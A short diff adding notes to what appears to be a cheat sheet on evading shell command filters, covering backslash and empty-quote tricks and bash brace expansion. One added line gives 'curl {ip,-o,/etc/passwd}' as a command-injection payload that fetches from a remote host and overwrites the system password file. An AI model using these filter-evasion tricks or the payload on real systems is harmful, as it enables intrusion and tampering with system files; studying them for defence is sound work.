@@ -9,3 +9,10 @@ ls ==  \l\s
 ls == l''s               double single quote  not double quote
 
 sometimes whitespace don't need encode
+
+#### bash only
+
+```
+$ e{cho,asd}            ===   echo easd            {,} is wildcards
+can be used to do command injection curl {ip,-o,/etc/passwd}
+```
